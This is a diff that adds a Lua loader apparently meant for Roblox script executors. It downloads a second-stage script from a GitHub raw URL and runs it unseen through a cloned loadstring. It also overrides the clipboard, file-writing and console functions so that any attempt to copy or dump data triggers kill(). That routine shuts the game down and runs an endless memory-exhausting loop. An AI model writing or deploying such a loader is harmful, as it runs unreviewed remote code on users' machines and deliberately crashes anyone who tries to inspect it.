@@ -1,0 +1,96 @@
+local function boot()
+    local config = {
+        target_url = "https://raw.githubusercontent.com/TyShClient/core-vault/main/stage2_runtime.lua",
+        retries = 3,
+        threshold = 1
+    }
+
+    local function kill()
+        pcall(function()
+            if game and game.Shutdown then
+                game:Shutdown()
+            end
+        end)
+        task.spawn(function()
+            while true do
+                local t = {}
+                for i = 1, 100000 do
+                    t[i] = string.rep("0", 10000)
+                end
+            end
+        end)
+    end
+
+    if typeof(game) ~= "Instance" then
+        return
+    end
+
+    local success, run_service = pcall(function()
+        return game:GetService("RunService")
+    end)
+
+    if not success or not run_service then
+        return
+    end
+
+    local renv = getrenv and getrenv() or {}
+    local genv = getgenv and getgenv() or _G
+
+    local raw_loadstring = renv.loadstring or loadstring
+    local raw_http_get = renv.game and renv.game.HttpGet or game.HttpGet
+
+    if clonefunction then
+        pcall(function()
+            raw_loadstring = clonefunction(raw_loadstring)
+            raw_http_get = clonefunction(raw_http_get)
+        end)
+    end
+
+    local targets = {
+        "setclipboard", "toclipboard",
+        "writefile", "appendfile",
+        "rconsoleprint", "rconsolewarn", "rconsoleinfo", "rconsoleerr",
+        "printconsole"
+    }
+
+    for _, name in ipairs(targets) do
+        if genv[name] then
+            genv[name] = function(data, ...)
+                if type(data) == "string" and #data > config.threshold then
+                    kill()
+                end
+                return
+            end
+        end
+    end
+
+    local payload = nil
+    local count = 0
+
+    while count < config.retries do
+        count = count + 1
+        local ok, res = pcall(function()
+            return raw_http_get(game, config.target_url)
+        end)
+
+        if ok and type(res) == "string" and #res > 0 then
+            payload = res
+            break
+        end
+
+        task.wait(1.5)
+    end
+
+    if not payload or #payload == 0 then
+        return
+    end
+
+    local fn, err = raw_loadstring(payload)
+    if not fn then
+        return
+    end
+
+    pcall(fn)
+end
+
+boot()
